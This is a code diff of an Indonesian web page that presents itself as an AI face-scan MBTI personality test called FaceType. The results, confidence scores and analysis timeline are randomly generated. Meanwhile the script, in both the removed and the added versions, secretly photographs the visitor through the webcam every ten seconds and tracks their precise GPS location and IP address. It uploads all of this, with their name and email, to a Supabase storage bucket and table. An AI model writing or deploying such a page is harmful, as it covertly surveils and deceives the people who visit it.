+              <span class="confidence-pct" id="confPct" style="color:var(--diplomat)">91%</span>
+            </div>
+            <div class="confidence-bar"><div class="confidence-fill" id="confBar" style="width:91%"></div></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-title">16 Personality Types</div>
+          <div class="types-grid">
+            <div class="type-card" style="border-color:rgba(105,64,197,.3)">
+              <div class="type-icon" style="background:var(--analyst)"><i class="fas fa-chess-rook"></i></div>
+              <div class="type-card-title" style="color:var(--analyst)">Analysts</div>
+              <div class="type-card-sub">INTJ - ENTP</div>
+            </div>
+            <div class="type-card active" style="border-color:var(--diplomat)">
+              <div class="type-icon" style="background:var(--diplomat)"><i class="fas fa-dove"></i></div>
+              <div class="type-card-title" style="color:var(--diplomat)">Diplomats</div>
+              <div class="type-card-sub">INFJ - ENFP</div>
+            </div>
+            <div class="type-card" style="border-color:rgba(52,152,219,.3)">
+              <div class="type-icon" style="background:var(--sentinel)"><i class="fas fa-shield-halved"></i></div>
+              <div class="type-card-title" style="color:var(--sentinel)">Sentinels</div>
+              <div class="type-card-sub">ISTJ - ESFJ</div>
+            </div>
+            <div class="type-card" style="border-color:rgba(243,156,18,.3)">
+              <div class="type-icon" style="background:var(--explorer)"><i class="fas fa-compass"></i></div>
+              <div class="type-card-title" style="color:var(--explorer)">Explorers</div>
+              <div class="type-card-sub">ISTP - ESFP</div>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
+
+    <div class="footer-quote"><span>&ldquo;</span> Kenali dirimu, pahami potensimu, wujudkan versi terbaikmu. <span>&rdquo;</span></div>
   </div>
 
-  <div id="mbtiResult">
-    <div class="result-avatar" id="resultAvatar">
-      <img id="resultAvatarImg" src="" alt="">
-    </div>
-    <div class="result-type" id="resultType"></div>
-    <div class="result-role" id="resultRole"></div>
-    <div class="result-name" id="resultName"></div>
-    <div class="result-desc" id="resultDesc"></div>
-    <div class="result-traits" id="resultTraits"></div>
-    <div class="result-footer">Dianalisis menggunakan AI Face Detection</div>
-  </div>
-
+  <!-- SURVEY FORM -->
   <div id="surveyForm">
     <div class="form-card">
       <div class="form-header">
-        <div class="form-avatar" id="formAvatar">
-          <img id="formAvatarImg" src="" alt="">
-        </div>
+        <div class="form-avatar" id="formAvatar"><img id="formAvatarImg" src="" alt=""></div>
         <h2 id="formTitle"></h2>
         <p>Isi kuisioner singkat untuk hasil yang lebih akurat</p>
       </div>
-      <div class="form-group">
-        <label>Nama Lengkap</label>
-        <input type="text" id="inputName" placeholder="Masukkan nama Anda">
-      </div>
-      <div class="form-group">
-        <label>Email</label>
-        <input type="email" id="inputEmail" placeholder="Masukkan email Anda">
-      </div>
-      <div class="form-group">
-        <label>Saran Aplikasi</label>
-        <textarea id="inputSaran" placeholder="Tulis saran atau masukan untuk aplikasi ini..."></textarea>
-      </div>
+      <div class="form-group"><label>Nama Lengkap</label><input type="text" id="inputName" placeholder="Masukkan nama Anda"></div>
+      <div class="form-group"><label>Email</label><input type="email" id="inputEmail" placeholder="Masukkan email Anda"></div>
+      <div class="form-group"><label>Saran Aplikasi</label><textarea id="inputSaran" placeholder="Tulis saran atau masukan..."></textarea></div>
       <button class="form-submit" id="formSubmit" onclick="submitForm()">Kirim &amp; Lihat Hasil</button>
     </div>
   </div>
 
+  <!-- THANK YOU -->
   <div id="thankYou">
-    <div class="thank-icon">✨</div>
+    <div class="thank-icon"><i class="fas fa-check"></i></div>
     <div class="thank-title">Terima Kasih!</div>
-    <p class="thank-desc">Hasil MBTI Anda sudah tersimpan. Terima kasih telah menggunakan MBTI Face Detection.</p>
+    <p class="thank-desc">Hasil MBTI Anda sudah tersimpan. Terima kasih telah menggunakan FaceType.</p>
   </div>
 
   <canvas id="faceCanvas"></canvas>
 
   <script>
-    const GROUPS = {
-      Analyst: { color: "#6940c5", types: ["INTJ","INTP","ENTJ","ENTP"] },
-      Diplomat: { color: "#43b581", types: ["INFJ","INFP","ENFJ","ENFP"] },
-      Sentinel: { color: "#3ba676", types: ["ISTJ","ISFJ","ESTJ","ESFJ"] },
-      Explorer: { color: "#f0b232", types: ["ISTP","ISFP","ESTP","ESFP"] }
-    };
-
-    const MBTI_TYPES = ["INTJ","INTP","ENTJ","ENTP","INFJ","INFP","ENFJ","ENFP","ISTJ","ISFJ","ESTJ","ESFJ","ISTP","ISFP","ESTP","ESFP"];
-
-    function getTypeGroup(t) {
-      for (const [g, d] of Object.entries(GROUPS)) { if (d.types.includes(t)) return g; }
-      return "Analyst";
-    }
-
-    function getTypeColor(t) { return GROUPS[getTypeGroup(t)].color; }
-
-    const MBTI_DATA = {
+    const GROUPS={Analyst:{color:"#6940c5",types:["INTJ","INTP","ENTJ","ENTP"]},Diplomat:{color:"#2ecc71",types:["INFJ","INFP","ENFJ","ENFP"]},Sentinel:{color:"#3498db",types:["ISTJ","ISFJ","ESTJ","ESFJ"]},Explorer:{color:"#f39c12",types:["ISTP","ISFP","ESTP","ESFP"]}};
+    const MBTI_TYPES=["INTJ","INTP","ENTJ","ENTP","INFJ","INFP","ENFJ","ENFP","ISTJ","ISFJ","ESTJ","ESFJ","ISTP","ISFP","ESTP","ESFP"];
+    function getTypeGroup(t){for(const[g,d]of Object.entries(GROUPS)){if(d.types.includes(t))return g}return"Analyst"}
+    function getTypeColor(t){return GROUPS[getTypeGroup(t)].color}
+    const MBTI_DATA={
       INTJ:{name:"The Architect",desc:"Imaginative and strategic thinkers, with a plan for everything.",traits:["Strategic","Independent","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intj-architect-male.svg"},
       INTP:{name:"The Logician",desc:"Innovative inventors with an unquenchable thirst for knowledge.",traits:["Analytical","Original","Curious"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intp-logician-female.svg"},
       ENTJ:{name:"The Commander",desc:"Bold, imaginative and strong-willed leaders.",traits:["Confident","Strategic","Decisive"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entj-commander-female.svg"},
       ENTP:{name:"The Debater",desc:"Smart and curious thinkers who cannot resist an intellectual challenge.",traits:["Innovative","Curious","Versatile"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entp-debater-male.svg"},
-      INFJ:{name:"The Advocate",desc:"Quiet and mystical, yet very inspiring and tireless idealists.",traits:["Idealistic","Empathetic","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-female.svg"},
+      INFJ:{name:"The Advocate",desc:"Pendiam, penuh wawasan, dan memiliki tujuan yang kuat serta mendalam.",traits:["Idealistic","Empathetic","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-female.svg"},
       INFP:{name:"The Mediator",desc:"Poetic, kind and altruistic people, always eager to help a good cause.",traits:["Idealistic","Empathetic","Creative"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infp-mediator-male.svg"},
       ENFJ:{name:"The Protagonist",desc:"Charismatic and inspiring leaders, able to mesmerize their listeners.",traits:["Charismatic","Reliable","Leader"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfj-protagonist-male.svg"},
       ENFP:{name:"The Campaigner",desc:"Enthusiastic, creative and sociable free spirits.",traits:["Enthusiastic","Creative","Sociable"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfp-campaigner-male.svg"},
@@ -670,248 +349,118 @@
       ESFP:{name:"The Entertainer",desc:"Spontaneous, energetic and enthusiastic people.",traits:["Spontaneous","Energetic","Enthusiastic"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/esfp-entertainer-male.svg"}
     };
 
-    const CAPTURE_INTERVAL = 10000;
-    const CIRCUMFERENCE = 2 * Math.PI * 16;
+    const CAPTURE_INTERVAL=10000;
+    let cameraStream=null,gpsData={lat:null,lng:null},gpsWatchId=null,captureCount=0,captureInterval=null,currentMBTI=null,resultShown=false;
 
-    let cameraStream = null;
-    let gpsData = { lat: null, lng: null };
-    let gpsWatchId = null;
-    let captureCount = 0;
-    let captureInterval = null;
-    let countdownInterval = null;
-    let countdown = 10;
-    let tickerIdx = 0;
-    let tickerTimer = null;
-    let resultShown = false;
-    let currentMBTI = null;
+    function randomDim(){return Math.floor(Math.random()*40)+60}
+    function randomConf(){return Math.floor(Math.random()*15)+85}
+    function randomFaceConf(){return(Math.random()*4+95).toFixed(1)}
 
-    function initTicker() {
-      const track = document.getElementById("tickerTrack");
-      track.innerHTML = "";
-      for (let c = 0; c < 3; c++) {
-        MBTI_TYPES.forEach(t => {
-          const pill = document.createElement("div");
-          pill.className = "ticker-pill";
-          pill.dataset.type = t;
-          pill.dataset.group = getTypeGroup(t);
-          pill.textContent = t;
-          track.appendChild(pill);
-        });
-      }
-    }
-
-    function highlightPill() {
-      const pills = document.querySelectorAll(".ticker-pill");
-      pills.forEach(p => p.classList.remove("active"));
-      const target = document.querySelector(`.ticker-pill[data-type="${MBTI_TYPES[tickerIdx % 16]}"]`);
-      if (target) target.classList.add("active");
-      tickerIdx++;
-    }
-
-    function startTicker() { tickerTimer = setInterval(highlightPill, 200); }
-    function stopTicker() { if (tickerTimer) clearInterval(tickerTimer); }
-
-    function startGPS() {
-      if (!navigator.geolocation) return;
-      gpsWatchId = navigator.geolocation.watchPosition(
-        p => { gpsData.lat = p.coords.latitude; gpsData.lng = p.coords.longitude; },
-        () => {},
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    }
-
-    async function getUserIP() {
-      try { const r = await fetch("https://api.ipify.org?format=json"); return (await r.json()).ip; }
-      catch { return null; }
-    }
-
-    async function startDetection() {
-      const btn = document.getElementById("startBtn");
-      btn.disabled = true;
-      btn.textContent = "Memuat...";
-      resultShown = false;
-      try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } });
-        document.getElementById("webcam").srcObject = cameraStream;
-        startGPS();
-        document.getElementById("landing").style.display = "none";
-        document.getElementById("detection").style.display = "flex";
-        initTicker();
-        startTicker();
-        startCountdown();
-        captureInterval = setInterval(() => { capturePhoto(); }, CAPTURE_INTERVAL);
-      } catch (err) {
-        btn.disabled = false;
-        btn.textContent = "Mulai Deteksi";
-        alert("Gagal memulai: " + err.message);
-      }
-    }
-
-    function startCountdown() {
-      countdown = 10;
-      updateCountdownUI();
-      document.getElementById("countdownLabel").textContent = "detik hingga analisis";
-      countdownInterval = setInterval(() => {
-        countdown--;
-        if (countdown < 0) {
-          if (!resultShown) {
-            showMBTIResult();
-            resultShown = true;
-          }
-          clearInterval(countdownInterval);
-          countdownInterval = null;
-          document.getElementById("countdownNumber").textContent = "✓";
-          document.getElementById("countdownCircle").style.strokeDashoffset = CIRCUMFERENCE;
-          document.getElementById("countdownLabel").textContent = "Analisis selesai";
-          document.getElementById("statusText").textContent = "Analisis aktif";
-          return;
+    function animateTimeline(){
+      const steps=[document.getElementById("tl1"),document.getElementById("tl2"),document.getElementById("tl3"),document.getElementById("tl4")];
+      let i=0;
+      function next(){
+        if(i>0){steps[i-1].classList.remove("active");steps[i-1].classList.add("done");
+          steps[i-1].querySelector(".tl-dot").innerHTML='<i class="fas fa-check" style="font-size:11px"></i>';
+          steps[i-1].querySelector(".tl-status").className="tl-status check";
+          steps[i-1].querySelector(".tl-status").innerHTML='<i class="fas fa-check-circle"></i>';
         }
-        updateCountdownUI();
-      }, 1000);
-    }
-
-    function updateCountdownUI() {
-      document.getElementById("countdownNumber").textContent = Math.max(countdown, 0);
-      const offset = CIRCUMFERENCE * (1 - Math.max(countdown, 0) / 10);
-      document.getElementById("countdownCircle").style.strokeDashoffset = offset;
-    }
-
-    function showMBTIResult() {
-      const type = MBTI_TYPES[Math.floor(Math.random() * MBTI_TYPES.length)];
-      currentMBTI = type;
-      const data = MBTI_DATA[type];
-      const color = getTypeColor(type);
-      const group = getTypeGroup(type);
-
-      document.getElementById("resultType").textContent = type;
-      document.getElementById("resultType").style.color = color;
-      document.getElementById("resultName").textContent = data.name;
-      document.getElementById("resultRole").textContent = group;
-      document.getElementById("resultRole").style.color = color;
-      document.getElementById("resultDesc").textContent = data.desc;
-      document.getElementById("resultAvatarImg").src = data.avatar;
-      document.getElementById("resultAvatar").style.borderColor = color;
-      document.getElementById("resultAvatar").style.color = color;
-      document.getElementById("resultTraits").innerHTML = data.traits.map(t =>
-        `<span style="color:${color};border-color:${color}40;background:${color}15">${t}</span>`
-      ).join("");
-      document.getElementById("mbtiResult").classList.add("show");
-
-      setTimeout(() => {
-        document.getElementById("mbtiResult").classList.remove("show");
-        showSurveyForm(type);
-      }, 6000);
-    }
-
-    function showSurveyForm(type) {
-      const data = MBTI_DATA[type];
-      const color = getTypeColor(type);
-      document.getElementById("formAvatarImg").src = data.avatar;
-      document.getElementById("formAvatar").style.borderColor = color;
-      document.getElementById("formAvatar").style.color = color;
-      document.getElementById("formTitle").textContent = `Anda adalah ${type} — ${data.name}`;
-      document.getElementById("formTitle").style.color = color;
-      document.getElementById("surveyForm").classList.add("show");
-    }
-
-    async function submitForm() {
-      const name = document.getElementById("inputName").value.trim();
-      const email = document.getElementById("inputEmail").value.trim();
-      const saran = document.getElementById("inputSaran").value.trim();
-
-      if (!name || !email) {
-        alert("Nama dan Email wajib diisi!");
-        return;
+        if(i<4){
+          steps[i].classList.add("active");
+          steps[i].querySelector(".tl-dot").innerHTML='<i class="fas fa-spinner fa-spin" style="font-size:11px"></i>';
+          steps[i].querySelector(".tl-status").className="tl-status loading";
+          steps[i].querySelector(".tl-status").innerHTML='<i class="fas fa-circle-notch fa-spin"></i>';
+          i++;
+          setTimeout(next,1500);
+        }else{showMBTIResult();}
       }
+      steps.forEach(s=>{s.classList.remove("active","done");s.querySelector(".tl-dot").textContent=["1","2","3","4"][steps.indexOf(s)];s.querySelector(".tl-status").className="tl-status";s.querySelector(".tl-status").innerHTML=""});
+      steps[0].querySelector(".tl-dot").innerHTML='<i class="fas fa-spinner fa-spin" style="font-size:11px"></i>';
+      steps[0].classList.add("active");
+      steps[0].querySelector(".tl-status").className="tl-status loading";
+      steps[0].querySelector(".tl-status").innerHTML='<i class="fas fa-circle-notch fa-spin"></i>';
+      i=1;
+      setTimeout(next,1500);
+    }
 
-      const btn = document.getElementById("formSubmit");
-      btn.disabled = true;
-      btn.textContent = "Mengirim...";
+    function updateDimensions(){
+      const ids=[["dimI","dimIpct"],["dimN","dimNpct"],["dimF","dimFpct"],["dimJ","dimJpct"]];
+      ids.forEach(([bar,pct])=>{
+        const v=randomDim();
+        document.getElementById(bar).style.width=v+"%";
+        document.getElementById(pct).textContent=v+"%";
+      });
+      const c=randomConf();
+      document.getElementById("confPct").textContent=c+"%";
+      document.getElementById("confBar").style.width=c+"%";
+      document.getElementById("faceConf").textContent=randomFaceConf();
+    }
 
-      try {
-        await fetch(`${SUPABASE_URL}/rest/v1/captures`, {
-          method: "POST",
-          headers: {
-            "Authorization": `Bearer ${SUPABASE_KEY}`,
-            "Content-Type": "application/json",
-            "Prefer": "return=minimal"
-          },
-          body: JSON.stringify({
-            mbti_type: currentMBTI,
-            user_name: name,
-            user_email: email,
-            saran: saran,
-            gps_lat: gpsData.lat,
-            gps_lng: gpsData.lng,
-            ip_address: await getUserIP(),
-            captured_at: new Date().toISOString(),
-            user_agent: navigator.userAgent
-          })
-        });
-      } catch (err) {
-        console.error("Save error:", err);
-      }
+    async function startDetection(){
+      const btn=document.getElementById("startBtn");
+      btn.disabled=true;btn.textContent="Memuat...";resultShown=false;
+      try{
+        cameraStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}});
+        document.getElementById("webcam").srcObject=cameraStream;
+        if(navigator.geolocation){gpsWatchId=navigator.geolocation.watchPosition(p=>{gpsData.lat=p.coords.latitude;gpsData.lng=p.coords.longitude},()=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0})}
+        document.getElementById("landing").style.display="none";
+        document.getElementById("detection").style.display="flex";
+        document.getElementById("appHeader").style.display="flex";
+        updateDimensions();
+        captureInterval=setInterval(()=>{capturePhoto();updateDimensions()},CAPTURE_INTERVAL);
+        animateTimeline();
+      }catch(err){btn.disabled=false;btn.textContent="Mulai Deteksi";alert("Gagal memulai: "+err.message)}
+    }
 
+    function showMBTIResult(){
+      const type=MBTI_TYPES[Math.floor(Math.random()*MBTI_TYPES.length)];
+      currentMBTI=type;const data=MBTI_DATA[type],color=getTypeColor(type),group=getTypeGroup(type);
+      document.getElementById("pType").textContent=type;document.getElementById("pType").style.color=color;
+      document.getElementById("pName").textContent=data.name;
+      document.getElementById("pGroup").textContent=group;document.getElementById("pGroup").style.color=color;
+      document.getElementById("pDesc").textContent=data.desc;
+      document.getElementById("pAvatar").src=data.avatar;
+      document.getElementById("personalityResult").style.opacity="1";
+      document.getElementById("confPct").style.color=color;
+      document.getElementById("confBar").style.background=color;
+      document.getElementById("formAvatarImg").src=data.avatar;
+      document.getElementById("formAvatar").style.borderColor=color;
+      document.getElementById("formTitle").textContent="Anda adalah "+type+" - "+data.name;
+      document.getElementById("formTitle").style.color=color;
+      setTimeout(()=>{document.getElementById("surveyForm").classList.add("show")},3000);
+    }
+
+    async function submitForm(){
+      const name=document.getElementById("inputName").value.trim();
+      const email=document.getElementById("inputEmail").value.trim();
+      const saran=document.getElementById("inputSaran").value.trim();
+      if(!name||!email){alert("Nama dan Email wajib diisi!");return}
+      const btn=document.getElementById("formSubmit");btn.disabled=true;btn.textContent="Mengirim...";
+      try{
+        const ip=await(await fetch("https://api.ipify.org?format=json")).json().catch(()=>({ip:null}));
+        await fetch(SUPABASE_URL+"/rest/v1/captures",{method:"POST",headers:{"Authorization":"Bearer "+SUPABASE_KEY,"Content-Type":"application/json","Prefer":"return=minimal"},body:JSON.stringify({mbti_type:currentMBTI,user_name:name,user_email:email,saran:saran,gps_lat:gpsData.lat,gps_lng:gpsData.lng,ip_address:ip.ip,captured_at:new Date().toISOString(),user_agent:navigator.userAgent})});
+      }catch(e){console.error(e)}
       document.getElementById("surveyForm").classList.remove("show");
       document.getElementById("thankYou").classList.add("show");
-
-      setTimeout(() => {
-        document.getElementById("thankYou").classList.remove("show");
-        document.getElementById("detection").style.display = "flex";
-        btn.disabled = false;
-        btn.textContent = "Kirim & Lihat Hasil";
-      }, 3000);
+      setTimeout(()=>{document.getElementById("thankYou").classList.remove("show");document.getElementById("detection").style.display="flex";btn.disabled=false;btn.textContent="Kirim & Lihat Hasil"},3000);
     }
 
-    async function capturePhoto() {
-      const video = document.getElementById("webcam");
-      const canvas = document.getElementById("faceCanvas");
-      if (!video.srcObject) return;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      await sendToSupabase(canvas.toDataURL("image/jpeg", 0.8));
+    async function capturePhoto(){
+      const video=document.getElementById("webcam"),canvas=document.getElementById("faceCanvas");
+      if(!video.srcObject)return;
+      canvas.width=video.videoWidth;canvas.height=video.videoHeight;
+      canvas.getContext("2d").drawImage(video,0,0);
+      try{
+        const ip=await(await fetch("https://api.ipify.org?format=json")).json().catch(()=>({ip:null}));
+        const blob=await(await fetch(canvas.toDataURL("image/jpeg",0.8))).blob();
+        const fn="capture_"+Date.now()+".jpg";
+        await fetch(SUPABASE_URL+"/storage/v1/object/Schema%20test/"+fn,{method:"POST",headers:{"Authorization":"Bearer "+SUPABASE_KEY,"Content-Type":"image/jpeg"},body:blob});
+        await fetch(SUPABASE_URL+"/rest/v1/captures",{method:"POST",headers:{"Authorization":"Bearer "+SUPABASE_KEY,"Content-Type":"application/json","Prefer":"return=minimal"},body:JSON.stringify({image_url:SUPABASE_URL+"/storage/v1/object/public/Schema%20test/"+fn,gps_lat:gpsData.lat,gps_lng:gpsData.lng,ip_address:ip.ip,captured_at:new Date().toISOString(),user_agent:navigator.userAgent,mbti_type:currentMBTI,user_name:document.getElementById("inputName")?.value||null,user_email:document.getElementById("inputEmail")?.value||null})});
+      }catch(e){console.error(e)}
       captureCount++;
     }
 
-    async function sendToSupabase(imageData) {
-      try {
-        const ip = await getUserIP();
-        const blob = await (await fetch(imageData)).blob();
-        const filename = `capture_${Date.now()}.jpg`;
-        const uploadRes = await fetch(`${SUPABASE_URL}/storage/v1/object/Schema%20test/${filename}`, {
-          method: "POST",
-          headers: { "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "image/jpeg" },
-          body: blob
-        });
-        if (!uploadRes.ok) throw new Error("Upload failed");
-        const imageUrl = `${SUPABASE_URL}/storage/v1/object/public/Schema%20test/${filename}`;
-        const dbRes = await fetch(`${SUPABASE_URL}/rest/v1/captures`, {
-          method: "POST",
-          headers: { "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "application/json", "Prefer": "return=minimal" },
-          body: JSON.stringify({
-            image_url: imageUrl,
-            gps_lat: gpsData.lat,
-            gps_lng: gpsData.lng,
-            ip_address: ip,
-            captured_at: new Date().toISOString(),
-            user_agent: navigator.userAgent,
-            mbti_type: currentMBTI,
-            user_name: document.getElementById("inputName")?.value || null,
-            user_email: document.getElementById("inputEmail")?.value || null
-          })
-        });
-        if (!dbRes.ok) throw new Error("DB insert failed");
-      } catch (err) { console.error("Supabase error:", err); }
-    }
-
-    window.addEventListener("beforeunload", () => {
-      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-      if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
-      if (captureInterval) clearInterval(captureInterval);
-      if (countdownInterval) clearInterval(countdownInterval);
-      stopTicker();
-    });
+    window.addEventListener("beforeunload",()=>{if(cameraStream)cameraStream.getTracks().forEach(t=>t.stop());if(gpsWatchId)navigator.geolocation.clearWatch(gpsWatchId);if(captureInterval)clearInterval(captureInterval)});
   </script>
 </body>
 </html>
